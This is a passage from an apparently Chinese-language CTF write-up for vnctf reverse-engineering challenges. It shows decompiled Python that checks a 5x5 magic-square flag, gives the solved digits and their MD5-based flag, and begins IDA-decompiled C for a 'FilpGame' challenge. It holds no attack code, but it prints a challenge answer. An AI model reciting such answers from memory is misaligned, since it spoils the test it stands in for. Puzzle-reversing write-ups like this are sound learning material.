    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str(hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;md5&amp;#39;&lt;/span&gt;, bytes((object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inputflag), encoding&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;))&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest())
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x[:&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;e3a912&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;# md5 start with &amp;#39;e3a912&amp;#39;&lt;/span&gt;
        sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
    object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x


&lt;span style=&#34;color:#a6e22e&#34;&gt;@object_a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;え(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;initlist&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(a, b):
    j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, len(object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inputflag), &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
        j &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inputflag[i])
        b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;inputflag[(i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)])
        object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b[a][b] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; j &lt;span style=&#34;color:#75715e&#34;&gt;# 为list_b赋值&lt;/span&gt;


&lt;span style=&#34;color:#a6e22e&#34;&gt;@object_a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;え(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;basiccheck&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(a, b):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
        sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;:
        sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
        sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
&lt;span style=&#34;color:#75715e&#34;&gt;# 024334xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx23xxxx1001xx&lt;/span&gt;

&lt;span style=&#34;color:#a6e22e&#34;&gt;@object_a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;え(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(a, b):
    int &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
            int &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b[a][i]

        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; int &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;int:
            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
            int &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_b[i][b]

        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; int &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;int:
            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
&lt;span style=&#34;color:#75715e&#34;&gt;# list_b 每行每列和为65&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 02433420112112034430403122130414004132233324100142&lt;/span&gt;

object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;string&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;welcome baby~ &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;string&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;input your flag~:&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;input&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;string&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;your input is:&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;string&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;string&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;let&amp;#39;s check......&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sleep&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, [[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)]]],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, [[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)]]],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, [[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)]]],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, [[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)]]],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, [[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)]]], &lt;span style=&#34;color:#75715e&#34;&gt;# list_b 包含5个五元list&lt;/span&gt;
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;crypt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;initlist&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;basiccheck&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;string&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Goodjob!&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;string&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;The flag is vnctf{&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;string&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;string&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
 [
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exit&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]]
object_a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不太懂python的注解，这里好像是通过给定的字符串调用相应的函数？&lt;/p&gt;
&lt;p&gt;整体就是一个五阶幻方，最后使用hashlib里的md5算一下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; hashlib
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;md5&amp;#39;&lt;/span&gt;, bytes((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;02433420112112034430403122130414004132233324100142&amp;#39;&lt;/span&gt;), encoding&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;))&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;e3a912c1e911ad82544af0c3d753f44f&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;套上 &lt;code&gt;vnctf{}&lt;/code&gt; 即可&lt;/p&gt;
&lt;h2 id=&#34;filpgame&#34;&gt;FilpGame&lt;/h2&gt;
&lt;p&gt;官方WP写的好玄学，其实用z3也可以解的&lt;/p&gt;
&lt;h3 id=&#34;逆向分析&#34;&gt;逆向分析&lt;/h3&gt;
&lt;p&gt;拖入ida，通过字符串定位到关键代码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  sub_401020(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input: &amp;#34;&lt;/span&gt;);
  sub_401050(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, inputstring, &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt;);
  v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( inputstring[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] )
  {
    v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dword_403398;
    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dword_40339C;
    v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dword_403398;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;214&lt;/span&gt; )
    {
      v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v0;
      v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;inputstring[v0];
      v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v5 )                                 &lt;span style=&#34;color:#75715e&#34;&gt;// 第奇数位
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      {
        v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9u&lt;/span&gt; )
        {
          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v6 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19u&lt;/span&gt; )&lt;span style=&#34;color:#75715e&#34;&gt;// 大于大写字母时
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;          {
            v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
            dword_40339C &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
          }
          &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;                                  &lt;span style=&#34;color:#75715e&#34;&gt;// 大写字母时
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;          {
            v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7&amp;#39;&lt;/span&gt;;
            dword_40339C &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7&amp;#39;&lt;/span&gt;;
          }
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;                                    &lt;span style=&#34;color:#75715e&#34;&gt;// 为数字时
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        {
          v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;;
          dword_40339C &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;;
        }
      }
      &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;                                      &lt;span style=&#34;color:#75715e&#34;&gt;// 偶数位
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      {
        v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9u&lt;/span&gt; )
        {
          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)(v7 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19u&lt;/span&gt; )
          {
            dword_403398 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
